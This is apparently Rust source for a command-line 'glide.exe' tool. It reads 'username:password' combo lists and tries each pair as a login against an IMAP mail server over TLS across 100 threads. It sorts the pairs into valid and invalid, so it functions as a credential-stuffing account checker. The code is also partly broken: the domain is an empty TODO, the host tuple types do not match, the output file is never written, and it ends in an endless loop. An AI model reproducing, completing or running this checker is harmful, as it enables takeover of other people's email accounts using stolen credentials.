use std::{env, fs::{self, File}, io::{self, BufRead}, path::Path, time::Duration, thread};
use colored::Colorize;
use sinner::Sin;
use threadpool::ThreadPool;
use tokio::runtime::Runtime;

fn valid_mail(username: &str, password: &str) -> imap::error::Result<Option<String>> {
    let domain = ""; // TODO
    let client = imap::ClientBuilder::new(domain, 993).native_tls()?;
    let mut imap_session = client
        .login(username, password)
        .map_err(|e| e.0)?;
    imap_session.logout().unwrap();
    Ok(Some("OK".to_string()))
}

fn main_worker(input: &String, output: &String, resume: bool) {
    let input_path = Path::new(input);
    if !input_path.exists() {
        println!("{}", "Input file does not exist".red());
        return
    }

    let output_path = Path::new(output);
    let output_file = File::create(output_path)
        .expect("Failed to create Output file".red().trim());

    let hosts: Vec<(String, i32)> = init_hosts();
    if hosts.is_empty() {
        println!("{}", "Hostがありません".red());
        return
    }

    let mut start_line: usize = 0;
    if resume {
        start_line = find_last_line();
    }

    let runtime = Runtime::new().unwrap();
    let pool = ThreadPool::new(100);
    let mut valid: Sin<Vec<String>> = Sin::new(vec![]);
    let mut invalid: Sin<Vec<String>> = Sin::new(vec![]);

    if let Ok(lines) = read_lines(input_path) {
        runtime.block_on(async move {
            for (i, line) in lines.enumerate() {
                if i <= start_line { continue }
                if let Ok(combo) = line {
                    pool.execute(move || {
                        let split: Vec<&str> = combo.split(":").collect();
                        let username = split.get(0).unwrap();
                        let password = split.get(1).unwrap();
                        if valid_mail(username, password).is_ok() {
                            println!("{}", format!("Valid: {}", combo).green());
                            valid.push(combo);
                        } else {
                            println!("{}", format!("Invalid: {}", combo).bright_red());
                            invalid.push(combo);
                        }
                    });
                }

                thread::sleep(Duration::from_millis(20));
            }
        });
    }

    println!("Valid: {}, Invalid: {}", valid.len(), invalid.len());
    loop {}
}

fn find_last_line() -> usize {
    let line_log = Path::new("last_line.txt");
    if !line_log.exists() { return 0 }
    if let Ok(line) = fs::read_to_string(line_log) {
        return line.parse().unwrap()
    }
    return 0
}

fn init_hosts() -> Vec<(String, String, i32)> {
    let mut hosts: Vec<(String, String, i32)> = vec![];
    let path = Path::new("hosts.txt");
    if !path.exists() { return hosts }
    if let Ok(lines) = read_lines(path) {
        for line in lines {
            if let Ok(host) = line {
                let split: Vec<&str> = host.split(":").collect();
                hosts.push((
                    split.get(0).unwrap().to_string(),
                    split.get(1).unwrap().to_string(),
                    split.get(2).unwrap().parse().unwrap()
                ));
            }
        }
    }
    return hosts
}

// https://doc.rust-lang.org/rust-by-example/std_misc/file/read_lines.html
fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>> where P: AsRef<Path>, {
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

#[tokio::main]
async fn main() {
    let args_c: Vec<String> = env::args().collect();

    let input = args_c.get(1);
    if input.is_none() {
        println!("{}", "No input".red());
        print_usage();
        return
    }

    let output = args_c.get(2);
    if output.is_none() {
        println!("{}", "No output".red());
        print_usage();
        return
    }

    let resume = !env::args().find(|p| p.eq("--resume")).is_none();
    main_worker(input.unwrap(), output.unwrap(), resume);
}

fn print_usage() {
    println!("glide.exe <input> <output> ...");
    println!(" --resume : Resume from the middle.");
}
